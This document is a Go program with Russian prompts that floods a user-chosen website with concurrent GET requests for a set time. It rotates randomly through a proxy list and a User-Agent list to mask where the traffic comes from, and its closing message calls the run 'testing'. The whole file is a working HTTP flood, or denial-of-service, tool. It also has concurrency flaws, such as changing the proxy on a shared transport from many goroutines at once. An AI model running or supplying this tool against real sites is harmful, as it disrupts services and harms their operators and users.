package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

func main() {
	reader := bufio.NewReader(os.Stdin)

	fmt.Print("Введите адрес сайта: ")
	websiteURL, _ := reader.ReadString('\n')
	websiteURL = strings.TrimSpace(websiteURL)

	fmt.Print("Введите количество горутин: ")
	concurrencyStr, _ := reader.ReadString('\n')
	concurrencyStr = strings.TrimSpace(concurrencyStr)
	concurrency, err := strconv.Atoi(concurrencyStr)
	if err != nil {
		fmt.Printf("Ошибка ввода количества горутин: %v\n", err)
		return
	}

	fmt.Print("Введите количество запросов на каждую горутину: ")
	requestsPerGoroutineStr, _ := reader.ReadString('\n')
	requestsPerGoroutineStr = strings.TrimSpace(requestsPerGoroutineStr)
	requestsPerGoroutine, err := strconv.Atoi(requestsPerGoroutineStr)
	if err != nil {
		fmt.Printf("Ошибка ввода количества запросов: %v\n", err)
		return
	}

	fmt.Print("Введите время работы в секундах: ")
	durationStr, _ := reader.ReadString('\n')
	durationStr = strings.TrimSpace(durationStr)
	duration, err := strconv.Atoi(durationStr)
	if err != nil {
		fmt.Printf("Ошибка ввода времени работы: %v\n", err)
		return
	}

	proxyListFile := "proxy_list.txt"       // Замените путь к файлу со списком прокси
	userAgentListFile := "user_agent.txt"   // Замените путь к файлу со списком User-Agent

	proxyList := readLines(proxyListFile)
	userAgentList := readLines(userAgentListFile)

	transport := &http.Transport{}
	client := &http.Client{Transport: transport}

	var wg sync.WaitGroup

	startTime := time.Now()
	endTime := startTime.Add(time.Duration(duration) * time.Second)

	for time.Now().Before(endTime) {
		for i := 0; i < concurrency; i++ {
			wg.Add(1)

			go func() {
				defer wg.Done()

				for j := 0; j < requestsPerGoroutine; j++ {
					proxyURL := getRandomProxy(proxyList)
					userAgent := getRandomUserAgent(userAgentList)

					proxy, _ := url.Parse(proxyURL)
					transport.Proxy = http.ProxyURL(proxy)

					req, _ := http.NewRequest("GET", websiteURL, nil)
					req.Header.Set("User-Agent", userAgent)

					resp, err := client.Do(req)
					if err != nil {
						fmt.Printf("Ошибка при отправке запроса: %v\n", err)
						continue
					}
					defer resp.Body.Close()

					fmt.Printf("Получен ответ: %s\n", resp.Status)
				}
			}()
		}

		wg.Wait()
	}

	elapsedTime := time.Since(startTime)
	fmt.Printf("Тестирование завершено. Общее время: %s\n", elapsedTime)
}

func readLines(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("Ошибка при открытии файла: %v\n", err)
		os.Exit(1)
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		fmt.Printf("Ошибка при чтении файла: %v\n", err)
		os.Exit(1)
	}

	return lines
}

func getRandomProxy(proxyList []string) string {
	rand.Seed(time.Now().UnixNano())
	index := rand.Intn(len(proxyList))
	return proxyList[index]
}

func getRandomUserAgent(userAgentList []string) string {
	rand.Seed(time.Now().UnixNano())
	index := rand.Intn(len(userAgentList))
	return userAgentList[index]
}
